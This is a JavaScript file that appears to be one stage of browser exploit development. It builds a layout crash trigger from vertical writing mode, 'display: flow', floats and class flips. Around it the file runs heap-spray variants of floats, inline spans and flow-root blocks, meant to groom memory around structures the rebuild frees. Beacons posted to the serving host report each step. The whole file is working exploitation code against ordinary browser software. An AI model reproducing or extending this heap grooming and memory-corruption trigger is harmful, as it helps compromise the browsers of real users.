// p504 — case 176 pre-flip page-retention spray.
// p503 proved every after-flip main-document append/offsetWidth triggers the
// target rebuild before the spray can allocate. So spray BEFORE the flips:
// pre-layout target -> spray same-size renderer/line-box/floating objects ->
// force spray layout -> class flips -> force target layout.
//
// Variants (p504var):
//   0 prefloats : 2000 float divs
//   1 prelines  : 2000 inline spans with text (line boxes / RootInlineBox churn)
//   2 premix    : 1000 floats + 1000 inline spans + 500 flow-root blocks
//   3 control   : no pre-spray (expected crash)
(function () {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var staged = [];
  ['BOOT','BUILT','PRE','SPRAY','SPRAYLAID','FLIP','FORCE','POST','DONE','ERR','HTMLERR']
    .forEach(function (n) {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V504-' + n);
      staged.push([n, x]);
    });
  function S(name, body) {
    try {
      for (var i = 0; i < staged.length; i++)
        if (staged[i][0] === name) { staged[i][1].send('[' + (Date.now() - T0) + 'ms] ' + (body || '')); return; }
    } catch (e) {}
  }

  var VARIANTS = ['prefloats', 'prelines', 'premix', 'control'];
  var vi = 0;
  try {
    vi = parseInt(localStorage.getItem('p504var') || '0', 10);
    if (isNaN(vi) || vi < 0) vi = 0;
    if (vi >= VARIANTS.length) vi = 0;
    localStorage.setItem('p504var', String((vi + 1) % VARIANTS.length));
  } catch (e) {}
  var variant = VARIANTS[vi];
  S('BOOT', 'variant=' + variant + ' idx=' + vi + ' ' + navigator.userAgent);

  var st = document.createElement('style');
  st.textContent = [
    '.vrl { writing-mode: vertical-rl; }',
    '#wide { display: inline-block; width: 100000000vmin; }',
    '#outer.flow { display: flow; }',
    '#inner:before { content: "A"; }',
    'object { float: inline-end; }',
    '.pf { float: left; width: 1px; height: 1px; }',
    '.pl { display: inline; }',
    '.pfr { display: flow-root; width: 1px; height: 1px; }'
  ].join('\n');
  document.head.appendChild(st);

  var container = document.createElement('div');
  container.id = 'container';
  container.className = 'vrl';
  var span = document.createElement('span');
  var wide = document.createElement('span'); wide.id = 'wide';
  var outer = document.createElement('span'); outer.id = 'outer'; outer.className = 'flow';
  var inner = document.createElement('span'); inner.id = 'inner';
  outer.appendChild(inner);
  var obj = document.createElement('object');
  var div = document.createElement('div'); div.id = 'div';
  span.appendChild(wide); span.appendChild(outer); span.appendChild(obj);
  container.appendChild(span); container.appendChild(div);
  document.body.appendChild(container);
  S('BUILT', 'vrl+flow+float');

  // Build the old float/line state (essential for the crash).
  try {
    inner.append(div.cloneNode());
    inner.scrollLeft;
  } catch (e) {
    S('ERR', 'pre ' + String(e && e.message).substring(0, 60));
    return;
  }
  S('PRE', 'pre-layout');

  // Pre-flip spray: allocate the same-size renderer/line-box objects and force
  // their layout BEFORE the class flips, so the freed target structures' pages
  // have live neighbours when the rebuild frees them.
  try {
    if (variant === 'prefloats') {
      var sc = document.createElement('div');
      for (var i = 0; i < 2000; i++) {
        var x = document.createElement('div');
        x.className = 'pf';
        sc.appendChild(x);
      }
      document.body.insertBefore(sc, document.body.firstChild);
      sc.offsetWidth;
      sc.getBoundingClientRect();
      S('SPRAY', 'prefloats=2000');
      S('SPRAYLAID', 'floats');
    } else if (variant === 'prelines') {
      var sc2 = document.createElement('div');
      for (var j = 0; j < 2000; j++) {
        var y = document.createElement('span');
        y.className = 'pl';
        y.textContent = 'A';
        sc2.appendChild(y);
      }
      document.body.insertBefore(sc2, document.body.firstChild);
      sc2.offsetWidth;
      sc2.getBoundingClientRect();
      S('SPRAY', 'prelines=2000');
      S('SPRAYLAID', 'lines');
    } else if (variant === 'premix') {
      var sc3 = document.createElement('div');
      for (var k = 0; k < 1000; k++) {
        var z = document.createElement('div'); z.className = 'pf'; sc3.appendChild(z);
      }
      for (var m = 0; m < 1000; m++) {
        var w = document.createElement('span'); w.className = 'pl'; w.textContent = 'A'; sc3.appendChild(w);
      }
      for (var n = 0; n < 500; n++) {
        var q = document.createElement('div'); q.className = 'pfr'; sc3.appendChild(q);
      }
      document.body.insertBefore(sc3, document.body.firstChild);
      sc3.offsetWidth;
      sc3.getBoundingClientRect();
      S('SPRAY', 'premix=2500');
      S('SPRAYLAID', 'mix');
    } else {
      S('SPRAY', 'none');
      S('SPRAYLAID', 'none');
    }
  } catch (e) {
    S('ERR', 'spray ' + String(e && e.message).substring(0, 60));
  }

  // Flips after the spray is live.
  outer.classList.remove('flow');
  container.classList.remove('vrl');
  S('FLIP', 'classes removed');

  S('FORCE', 'target layout');
  try { container.offsetWidth; } catch (e) {}
  requestAnimationFrame(function () {
    S('POST', 'survived-frame');
    S('DONE', '');
  });
})();
